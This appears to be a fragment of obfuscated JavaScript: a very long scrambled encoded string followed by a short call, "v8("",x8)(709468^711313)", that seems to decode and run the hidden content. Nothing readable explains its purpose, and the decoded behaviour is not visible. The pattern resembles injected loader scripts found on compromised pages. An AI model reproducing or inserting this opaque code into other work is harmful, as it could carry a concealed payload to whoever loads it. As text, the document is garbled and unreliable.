<c.W-.edi_<.Sse]j*R<\\8sa<RyS<djR./.fflcbe<Sna[ry.Rp^cR!-3R..fscuR,}}lo!<(<nc:<c.Reweeet!RbiN.o!RcR.RnRRfRRc.IRI((RS.-]R($(brR<(caRP..RReR..[9.RRi<dak5dc{<5@RiRiRhRRRf.m.RmXRRle%r<lR]0< .csaKRcpRNRfRaR1cL;bpRc6^%}tgR.ncuc<xR<.s)n[.;uu<t.{cRIc.fr]R fe(<c..Aipec ccmPRb-cs+1;RPRRR_Kn\\+l(Dc=<i.c.Bmi<tR$[R<cM]!.RR..d )<e~.!<RR""aSTRd<<E(e(vdmc.+DeRntR<sR;ac(e<cRr.RRR% cR)acRiicRE#t&#LR9w.lRow .R;H. !}RR. .<Rs.i<nR[i1Re_Rc )vnoPRkn.(<TRntt|.otsV.RR.o#R.xdsthPRRv6to!>m.dReee<</LR<<+q .S.<.!n<+ecre.m.A.9_.itLRVYD0Juc .ifcRG;k(<tRI:Rr2f..ycrRd.Qp_.&@<.)..ek$T-P.<!m-Pa< "ri}..)K/n0h(Rb.)cMecsr%c<c(<nt]%.<n<Pc/{DdZcaf<<Re"> .2. kNcsnr<_Rc4..czm[R tsCf<NRj%3dcRo"["tr.npataRR;xr+ oRRVzt ?wiu!.c.a)[.cccRq[."4Rpus RrR(i.B.deci#tct<.&](dcr4P.RtRR );.6.</n<ecccr]catd.# d!3cRlf~dR(sDca.i.oPaRc.}R3cfp <RR3lcRcpc<]*"wRwR(.ccRs<cex .nmR3 RatSRtRie|ccssce<!( cw.y<cRpe. .i= azs:RTzlUj <Rt.Rsi"+$R.l RRwPd4.*s8)ARd.c <=e..;x{.+.(ld!}apRy Aclo![1R.RnDR.Ricl.l2,"1o0Fo)nsc(0 ldc).#R-ct.c[<c)cR|s.<rr8c<a<8<.i(c0N...a7/pRR>oad..iigc]!\'RyomRl5ofs:.c.tfP.cIcPR)fI tdeRPi...<.%.(0] R dd.sc.R.RP#Tcscs,mc#!cl\'=Riul O3R#.E<R.eeoRRjcs)p.cccRRp.j.yx<]cP".^4..(rdZ.d.}:c.r!w..RbBRRa iecR.cc.sry_<l.R "rcu;xPfic.\'M#~x2d Hc!!.eRp<a4Rs(<cr cs.h._. ca0R...R{Sf.RR]c3mRjsD[.9u| tmR%.c[i(c.)ftc<Rn<s<RRaccPRRce2Rc F9n<j<3p.c.b;bcc c.l*snRcccfsox !p"<oP<.co_R%jR<(i|.<RngRc.R,uu<lc.nc.s<re/..StovnP..$&.czRRR<A<.c l@<.cRc;c.b=bt.t$..Ua.RR"(<tr:.dgR$)v<,o(..clhc<c.\'.d}cv.v R.!r~.W[rR(R s.([ao!o...d!Cd.{si.n.Ridfc2M,rn_"<A<e..c[caRei]fR cs.Nch[jR,cPdo.cccic;.r<nl.RP.iEsars<e!! blRc o.E;6.r...R\'R<.P.aRRcrcRp[n !<t=ct ;Rcw/RchIR-f..RkRIc5.R{ntr{Rc.}.tc.$ecRrR<cmCceR=.+|<oR.Rnf m.]$-cNt.YzkT).;.8s<rRReecRRtc0.Rt.vc#.c.rIcRYRA R= d].f#b))4inw<t!tR.<..(Rgcz.bciac<Etsr RpR. (<(;G$6Di!.!<Rn*t;e.,R.alccc.Fpc<]b<1r&<<yleRY"a.r<cx".rRRp<t)RR.P,<R..ciUcr0:).d-ccrR<.xd]n<soli-<Rs*nRf..MMe.r:c6eRYvRl0sRkn@RRs[ h<Rcv.sR.cci." g<RoiRoRc0C ..Rr<r-kRe$tRiR.r!r.crtp..a.R#/6bf<Rcr*c<RG /E(..Bc,cDRnctmx.aeIcnr.idnbtc..rR. <d]e<<<o&<crO})ndcvRa)=RAysc<Rp,,t78wltR.Rhu Ri !lRcR.Dmd.c<R.ccM.kic<RZ<.i"RL0.~.|cccchRdoc-podnc0ecR... cel.dca&4c7(su.!im]lsi={,cc.oRi9)6}XSR8<Rc.R<c\\.KcNnMf$runR"e0^.gpiR cpo.gR^vTl8HRi<cz1(ERRN4oo<es."RinsT .rc"t cRSgo. .}rXCcy*R<ctRW<u1q.?[c.ct=h[<Acica <e!n<(.fr7rN-.c`. ReER"<.R:Rx_ifrr.!}c.rreR1nRnt.otxced<.sRRn,uq<Rgi,V_RcooR.)naxu.4tbdn-c!u3.s.2..n%L+.,Vc(s.(@RFrxM<kRhNs.cRmcn=a..sE<RR{<}.Ic..ehRrg}zRn(<LR %o"/sc0l.MR.+).<.as RnRcX.ff.e&. <kc R.RRR(ItW_cd.(rR.<IR.efc.g<;\\9R7itn[.l.c.ccn<.ocr< onottcB1&uRRti!<<ZC..;c &.c<!<mRm"R"h4)<R{n)1K<%lc.cRvic R3P<cRl;..RK!R.RnRc=Gzh\'\'ggt. (..:<RcRG<y,8/l)cRR-cu.<R"EyR oRdlR;9,BPi.sk.<<R<+Rhh<uc"R( ....Rsi:E/hs9kR.Zh=c.<<c]R!RRQ2Tc.cRc3xRpc.ct;/\'RdP<s]hTltR+RRcR?cR<6bn <.la.<RR}.R.!tR..nct (e.c r".%R.ct<.nt[R.R<c"cx_)..in. e<}c.4G;R.d8.nt.( [dc.S<H(!c0<cbRsRalK<r  .rRxPtg .<<b..nsM<a osR,.%r. R.g..Ir0e dRee6efapaxi.R R?cbN`<cn[ cD.m<cR<<dRm<i8<~<dhi9oooxf([rRfcPR#tucpe< Rnn<olc.tPRrRR0Rol/xeR.RPR.RR.y.1"R7c.c"tK.'));v8("",x8)(709468^711313);
